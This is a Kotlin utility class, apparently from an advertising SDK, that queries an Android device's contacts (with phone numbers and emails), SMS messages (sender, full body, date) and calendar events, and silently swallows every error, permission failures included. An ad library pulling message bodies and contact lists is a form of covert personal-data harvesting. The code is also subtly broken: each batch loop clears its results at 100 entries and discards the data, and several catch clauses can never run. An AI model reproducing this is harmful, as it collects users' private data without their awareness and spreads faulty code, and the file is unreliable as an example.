/**
 * Helper class to safely access content providers with cursor callbacks
 */
package com.seamlabs.admore.sdk.core.storage

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.provider.ContactsContract
import android.provider.Telephony
import android.provider.CalendarContract
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import kotlinx.coroutines.yield
import java.util.concurrent.CancellationException

/**
 * Utility class for safely handling ContentResolver operations
 */
class ContentResolverUtils(private val context: Context) {

    companion object {
        private const val BATCH_SIZE = 100 // Process data in batches to avoid memory issues
        private const val YIELD_FREQUENCY = 25 // Yield every N iterations for better coroutine cooperation
    }

    /**
     * Safely query content provider and process cursor data
     */
    suspend fun <T> safeQuery(
        uri: Uri,
        projection: Array<String>? = null,
        selection: String? = null,
        selectionArgs: Array<String>? = null,
        sortOrder: String? = null,
        processor: suspend (Cursor) -> T
    ): List<T> = withContext(Dispatchers.IO) {
        val results = mutableListOf<T>()
        var cursor: Cursor? = null
        var processedCount = 0

        try {
            cursor = context.contentResolver.query(
                uri,
                projection,
                selection,
                selectionArgs,
                sortOrder
            )

            cursor?.let {
                while (it.moveToNext()) {
                    try {
                        // Yield periodically for better coroutine cooperation
                        if (processedCount % YIELD_FREQUENCY == 0 && processedCount > 0) {
                            yield()
                        }

                        results.add(processor(it))
                        processedCount++
                    } catch (e: CancellationException) {
                        throw e // Re-throw cancellation to respect coroutine cancellation
                    } catch (e: Exception) {
                        // Silently handle error (maintain original behavior)
                    }
                }
            }
        } catch (e: CancellationException) {
            throw e // Re-throw cancellation
        } catch (e: Exception) {
            // Silently handle error (maintain original behavior)
        } catch (e: OutOfMemoryError) {
            // Handle memory issues
            results.clear()
            // Suggest garbage collection
            System.gc()
        } catch (e: SecurityException) {
            // Handle permission issues
        } catch (e: IllegalArgumentException) {
            // Handle invalid arguments
        } catch (e: Throwable) {
            // Handle any other unexpected errors
        } finally {
            cursor.closeQuietly()
        }

        results
    }

    /**
     * Safely query contacts with batch processing
     */
    suspend fun safeQueryContacts(
        projection: Array<String>? = null,
        selection: String? = null,
        selectionArgs: Array<String>? = null,
        sortOrder: String? = null
    ): List<Map<String, Any>> = withContext(Dispatchers.IO) {
        val results = mutableListOf<Map<String, Any>>()
        var cursor: Cursor? = null
        var processedCount = 0

        try {
            cursor = context.contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                projection,
                selection,
                selectionArgs,
                sortOrder
            )

            cursor?.let {
                while (it.moveToNext()) {
                    try {
                        // Yield periodically for better coroutine cooperation
                        if (processedCount % YIELD_FREQUENCY == 0 && processedCount > 0) {
                            yield()
                        }

                        val contactId = it.getLongSafely(ContactsContract.Contacts._ID)
                        val contactData = mutableMapOf<String, Any>()

                        // Basic contact info
                        contactData["id"] = contactId
                        contactData["name"] = it.getStringSafely(ContactsContract.Contacts.DISPLAY_NAME) ?: "Unknown"

                        // Get detailed info in batches
                        try {
                            contactData.putAll(getContactDetails(contactId))
                        } catch (e: Exception) {
                            // Silently handle contact details error (maintain original behavior)
                        }

                        results.add(contactData)
                        processedCount++

                        // Process in batches to avoid memory issues
                        if (results.size >= BATCH_SIZE) {
                            // Process batch here if needed
                            results.clear()
                        }
                    } catch (e: CancellationException) {
                        throw e // Re-throw cancellation
                    } catch (e: Exception) {
                        // Silently handle error (maintain original behavior)
                    }
                }
            }
        } catch (e: CancellationException) {
            throw e // Re-throw cancellation
        } catch (e: Exception) {
            // Silently handle error (maintain original behavior)
        } catch (e: OutOfMemoryError) {
            // Handle memory issues
            results.clear()
            System.gc()
        } catch (e: SecurityException) {
            // Handle permission issues
        } catch (e: IllegalArgumentException) {
            // Handle invalid arguments
        } catch (e: Throwable) {
            // Handle any other unexpected errors
        } finally {
            cursor.closeQuietly()
        }

        results
    }

    /**
     * Safely query SMS messages with batch processing
     */
    suspend fun safeQuerySms(
        projection: Array<String>? = null,
        selection: String? = null,
        selectionArgs: Array<String>? = null,
        sortOrder: String? = null
    ): List<Map<String, Any>> = withContext(Dispatchers.IO) {
        val results = mutableListOf<Map<String, Any>>()
        var cursor: Cursor? = null
        var processedCount = 0

        try {
            cursor = context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                projection,
                selection,
                selectionArgs,
                sortOrder
            )

            cursor?.let {
                while (it.moveToNext()) {
                    try {
                        // Yield periodically for better coroutine cooperation
                        if (processedCount % YIELD_FREQUENCY == 0 && processedCount > 0) {
                            yield()
                        }

                        val messageData = mutableMapOf<String, Any>()

                        // Basic message info
                        messageData["id"] = it.getLongSafely(Telephony.Sms._ID)
                        messageData["address"] = it.getStringSafely(Telephony.Sms.ADDRESS) ?: "Unknown"
                        messageData["body"] = it.getStringSafely(Telephony.Sms.BODY) ?: ""
                        messageData["date"] = it.getLongSafely(Telephony.Sms.DATE)

                        results.add(messageData)
                        processedCount++

                        // Process in batches to avoid memory issues
                        if (results.size >= BATCH_SIZE) {
                            // Process batch here if needed
                            results.clear()
                        }
                    } catch (e: CancellationException) {
                        throw e // Re-throw cancellation
                    } catch (e: Exception) {
                        // Silently handle error (maintain original behavior)
                    }
                }
            }
        } catch (e: CancellationException) {
            throw e // Re-throw cancellation
        } catch (e: Exception) {
            // Silently handle error (maintain original behavior)
        } catch (e: OutOfMemoryError) {
            // Handle memory issues
            results.clear()
            System.gc()
        } catch (e: SecurityException) {
            // Handle permission issues
        } catch (e: IllegalArgumentException) {
            // Handle invalid arguments
        } catch (e: Throwable) {
            // Handle any other unexpected errors
        } finally {
            cursor.closeQuietly()
        }

        results
    }

    /**
     * Safely query calendar events with batch processing
     */
    suspend fun safeQueryCalendarEvents(
        projection: Array<String>? = null,
        selection: String? = null,
        selectionArgs: Array<String>? = null,
        sortOrder: String? = null
    ): List<Map<String, Any>> = withContext(Dispatchers.IO) {
        val results = mutableListOf<Map<String, Any>>()
        var cursor: Cursor? = null
        var processedCount = 0

        try {
            cursor = context.contentResolver.query(
                CalendarContract.Events.CONTENT_URI,
                projection,
                selection,
                selectionArgs,
                sortOrder
            )

            cursor?.let {
                while (it.moveToNext()) {
                    try {
                        // Yield periodically for better coroutine cooperation
                        if (processedCount % YIELD_FREQUENCY == 0 && processedCount > 0) {
                            yield()
                        }

                        val eventData = mutableMapOf<String, Any>()

                        // Basic event info
                        eventData["id"] = it.getLongSafely(CalendarContract.Events._ID)
                        eventData["title"] = it.getStringSafely(CalendarContract.Events.TITLE) ?: "Untitled"
                        eventData["description"] = it.getStringSafely(CalendarContract.Events.DESCRIPTION) ?: ""
                        eventData["start_time"] = it.getLongSafely(CalendarContract.Events.DTSTART)
                        eventData["end_time"] = it.getLongSafely(CalendarContract.Events.DTEND)

                        results.add(eventData)
                        processedCount++

                        // Process in batches to avoid memory issues
                        if (results.size >= BATCH_SIZE) {
                            // Process batch here if needed
                            results.clear()
                        }
                    } catch (e: CancellationException) {
                        throw e // Re-throw cancellation
                    } catch (e: Exception) {
                        // Silently handle error (maintain original behavior)
                    }
                }
            }
        } catch (e: CancellationException) {
            throw e // Re-throw cancellation
        } catch (e: Exception) {
            // Silently handle error (maintain original behavior)
        } catch (e: OutOfMemoryError) {
            // Handle memory issues
            results.clear()
            System.gc()
        } catch (e: SecurityException) {
            // Handle permission issues
        } catch (e: IllegalArgumentException) {
            // Handle invalid arguments
        } catch (e: Throwable) {
            // Handle any other unexpected errors
        } finally {
            cursor.closeQuietly()
        }

        results
    }

    private suspend fun getContactDetails(contactId: Long): Map<String, Any> = withContext(Dispatchers.IO) {
        val details = mutableMapOf<String, Any>()
        var cursor: Cursor? = null

        try {
            // Get phone numbers
            cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,
                "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                arrayOf(contactId.toString()),
                null
            )

            val phones = mutableListOf<String>()
            cursor?.let {
                while (it.moveToNext()) {
                    try {
                        val phoneNumber = it.getStringSafely(ContactsContract.CommonDataKinds.Phone.NUMBER)
                        phones.add(phoneNumber ?: "")
                    } catch (e: Exception) {
                        // Silently handle error (maintain original behavior)
                    }
                }
            }
            details["phones"] = phones
            cursor.closeQuietly()

            // Get email addresses
            cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                null,
                "${ContactsContract.CommonDataKinds.Email.CONTACT_ID} = ?",
                arrayOf(contactId.toString()),
                null
            )

            val emails = mutableListOf<String>()
            cursor?.let {
                while (it.moveToNext()) {
                    try {
                        val email = it.getStringSafely(ContactsContract.CommonDataKinds.Email.ADDRESS)
                        emails.add(email ?: "")
                    } catch (e: Exception) {
                        // Silently handle error (maintain original behavior)
                    }
                }
            }
            details["emails"] = emails
            cursor.closeQuietly()

        } catch (e: Exception) {
            // Silently handle error (maintain original behavior)
        } catch (e: OutOfMemoryError) {
            // Handle memory issues
            details.clear()
            System.gc()
        } catch (e: SecurityException) {
            // Handle permission issues
        } catch (e: IllegalArgumentException) {
            // Handle invalid arguments
        } catch (e: Throwable) {
            // Handle any other unexpected errors
        } finally {
            cursor.closeQuietly()
        }

        details
    }

    // Extension functions for safer cursor operations
    private fun Cursor?.closeQuietly() {
        try {
            this?.close()
        } catch (e: Exception) {
            // Silently handle cursor close error (maintain original behavior)
        }
    }

    private fun Cursor.getStringSafely(columnName: String): String? {
        return try {
            val columnIndex = getColumnIndex(columnName)
            if (columnIndex != -1) {
                getString(columnIndex)
            } else {
                null
            }
        } catch (e: Exception) {
            null
        }
    }

    private fun Cursor.getLongSafely(columnName: String): Long {
        return try {
            val columnIndex = getColumnIndex(columnName)
            if (columnIndex != -1) {
                getLong(columnIndex)
            } else {
                0L
            }
        } catch (e: Exception) {
            0L
        }
    }

    private fun Cursor.getIntSafely(columnName: String): Int {
        return try {
            val columnIndex = getColumnIndex(columnName)
            if (columnIndex != -1) {
                getInt(columnIndex)
            } else {
                0
            }
        } catch (e: Exception) {
            0
        }
    }
}